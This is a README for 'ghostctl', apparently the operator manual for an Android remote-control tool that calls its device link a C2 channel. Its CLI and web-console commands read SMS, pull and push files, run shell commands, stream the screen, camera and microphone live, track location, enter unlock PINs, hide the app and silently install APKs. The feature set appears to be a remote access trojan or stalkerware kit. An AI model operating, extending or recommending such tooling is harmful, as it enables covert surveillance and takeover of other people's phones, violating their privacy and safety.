# ghostctl server

Core daemon + CLI for the ghostctl Android remote-control toolset (see ../PROJECT.md).

## Files
- `daemon.py` — core daemon: WebSocket device listener (default `0.0.0.0:8443`),
  device registry (`state.json`), command router + history (`history.json`),
  admin JSON-RPC on `127.0.0.1:8444` (CLI transport), per-device live-stream
  frame cache (`StreamCache`), server→device file push (`files put` framing)
  and the `update self|sidekick` APK push flow. Admin authentication uses
  `GHOSTCTL_ADMIN_TOKEN`/`admin.key`; tokens are redacted in logs and outputs.
- `ghostctl.py` — CLI (symlink-friendly, e.g. `ln -s .../ghostctl.py ~/.local/bin/ghostctl`).
- `console.py` — web console (see below).
- `fake_client.py` — mock Android client for testing (echoes verbs, receives
  `files put` streams with sha256 verification, simulates `screen live`).
- `apks/` — APK store for `update` pushes (gitignored; populate with
  `ghostctl.py apks add ghostd|ghosta <path>`).

## Run
```sh
python3 daemon.py                     # defaults: 0.0.0.0:8443, admin 127.0.0.1:8444
python3 daemon.py --port 9000 --admin-port 9001
```

## CLI
```sh
python3 ghostctl.py list                                       # device registry (JSON)
python3 ghostctl.py streams                                    # live stream frame cache
python3 ghostctl.py -d test-1 shell "echo hi"               # per-device command
python3 ghostctl.py -d test-1 files ls /sdcard
python3 ghostctl.py -d test-1 files tree /sdcard --depth 3
python3 ghostctl.py -d test-1 files get /sdcard/x.jpg          # returns base64 content
python3 ghostctl.py -d test-1 files put <dest> <src>           # server pushes to dest
python3 ghostctl.py remove test-1                              # uninstall both apps
python3 ghostctl.py -d test-1 sms recent 20
python3 ghostctl.py -d test-1 screen shot
python3 ghostctl.py -d test-1 screen live --fps 5 --quality 60
python3 ghostctl.py -d test-1 screen stop
python3 ghostctl.py -d test-1 cam snap back
python3 ghostctl.py -d test-1 cam live front --quality high
python3 ghostctl.py -d test-1 mic live
python3 ghostctl.py -d test-1 brightness set 10
python3 ghostctl.py -d test-1 volume set media 30
python3 ghostctl.py -d test-1 ui dump
python3 ghostctl.py -d test-1 ui find --text Login
python3 ghostctl.py -d test-1 tap 100 200
python3 ghostctl.py -d test-1 type "hello world"
python3 ghostctl.py -d test-1 swipe 100 200 300 400
python3 ghostctl.py -d test-1 unlock 1234
python3 ghostctl.py -d test-1 sidekick status
python3 ghostctl.py -d test-1 sidekick install
python3 ghostctl.py -d test-1 loc once
python3 ghostctl.py -d test-1 device info
python3 ghostctl.py -d test-1 hide
python3 ghostctl.py -d test-1 status
python3 ghostctl.py apks list
python3 ghostctl.py apks add ghosta /path/to/ghosta.apk
python3 ghostctl.py -d test-1 update sidekick               # push APK + sidekick install
python3 ghostctl.py -d test-1 update self --apk /path/to/ghostd.apk
python3 ghostctl.py --all update                            # rejected
python3 ghostctl.py --pretty list                           # human-readable
```
Unknown verbs are rejected with a clean error (daemon whitelist `ACTIONS`).
Admin endpoint configurable via `GHOSTCTL_ADMIN_HOST` / `GHOSTCTL_ADMIN_PORT`.

## Update push
`ghostctl.py -d <id> update self|sidekick [--apk path]` pushes the APK to the
device over the C2 WebSocket using the client's `FileReceiver` protocol
(`files put <dest>` cmd + framed 64 KB `file_chunk` binaries + `file_end`
with sha256), then triggers the install verb (`sidekick install` for ghosta,
`update self` for ghostd). Default APKs live in `server/apks/`
(`ghosta.apk` / `ghostd.apk`, gitignored) — place them with
`ghostctl.py apks add ghostd|ghosta <path>`.

## Stream relay
Devices stream live media as framed binaries (`{"type":"frame","stream":..}`
+ JPEG payload, MediaBus framing). The daemon keeps the latest frame per
(device, stream) in a bounded cache (max 3 streams × 2 frames) and the
console serves it:
- `GET /stream/<id>/feed` — latest frame, `image/jpeg` (poll-friendly; 503
  when nothing is cached)
- `GET /stream/<id>/feed.mjpg` — `multipart/x-mixed-replace` MJPEG

## Web console
```sh
python3 console.py                    # http://127.0.0.1:9443 (localhost only)
GHOST_CONSOLE_PASS=sekrit python3 console.py --port 9443
# Native HTTPS for remote access:
openssl req -x509 -newkey rsa:2048 -sha256 -nodes -days 825 \
  -keyout console.key -out console.crt \
  -subj "/CN=203.0.113.10" \
  -addext "subjectAltName=IP:203.0.113.10"
chmod 600 console.key
python3 console.py --host 0.0.0.0 --certfile console.crt --keyfile console.key
```
Stdlib-only (http.server), server-rendered HTML, no CDNs — works offline.
Talks to the daemon by importing `ghostctl` and reusing its authenticated
`rpc()` (admin port, env `GHOSTCTL_ADMIN_HOST/PORT`). Bounded, redacted command
history is fetched through the daemon's `history` admin operation.

- Auth: HTTP Basic on every request. Password comes from `GHOST_CONSOLE_PASS`;
  for localhost-only use, an unset password is generated into mode-600
  `console.pass` rather than printed (username is ignored —
  `curl -u ghost:<pass>`). CSRF protection covers state-changing routes.
  Tokens, PINs and passwords are redacted from history and logs. CSRF tokens
  rotate with the console process; reload the page once after a restart or an
  HTTP-to-HTTPS switch so an old tab does not post a stale token.
- Binding: `127.0.0.1` by default. Native HTTPS uses
  `--certfile`/`--keyfile` (TLS 1.2+) and avoids the HTTP override. Non-loopback
  HTTP is refused unless `GHOST_CONSOLE_ALLOW_HTTP=1` is explicitly set; do not
  use that override for normal remote access. Only open the firewall when
  needed (`sudo ufw allow 9443/tcp`).
- Pages:
  - `/` dashboard with device cards, search/filter and pending approvals.
  - `/device/<id>` grouped Files, Screen, UI, Media and System actions plus
    recent history. PIN entry is intentionally CLI-only. Restart/update/revoke
    use confirmations; the explicit Remove Device action needs no second
    confirmation and uninstalls both apps without deleting personal data.
  - `/broadcast` — restricted to safe read/stop verbs.
  - `/stream/<id>` — live view with explicit start/stop and frame-age health;
    feed URLs include an unguessable stream token.
  - `/settings` — flood-cap editing.
  - File upload/download with progress/error reporting and abort support.
- POST `/device/<id>/cmd` runs a device action and renders a bounded result.
  The console `update` action uses the daemon's complete APK-push flow.

Current deployment: Kali runs this console HTTPS-only on :9443 with a
self-signed certificate for its IP, so browsers require a one-time trust
exception. External TLS and an authenticated CSRF-protected POST were verified;
plain HTTP on :9443 is rejected. Replace the certificate with a CA-issued one
for normal use. Device transport (:8443) remains `ws://` until the documented
WSS migration is done; do not treat console HTTPS as device-transport TLS.

## Test
```sh
python3 daemon.py &                 # or use --bind 127.0.0.1
python3 fake_client.py test-1 &      # mock device
python3 ghostctl.py list
python3 ghostctl.py -d test-1 shell "echo hi"
python3 ghostctl.py -d test-1 tap 100 200       # routed verb
python3 ghostctl.py -d test-1 screen live       # fake_client streams framed JPEGs
python3 ghostctl.py streams                     # cached frames
GHOST_CONSOLE_PASS=pw python3 console.py &   # then browse http://127.0.0.1:9443
# Copy the tokenized feed URL from the console's live-view page to fetch JPEGs.
python3 ghostctl.py apks add ghosta dummy.apk
python3 ghostctl.py -d test-1 update sidekick   # push + install (sha256-checked)
```

Requires `websockets` (`pip install --user websockets`). Do not commit
`state.json` / `history.json` / `apks/` (runtime artifacts, see `.gitignore`).
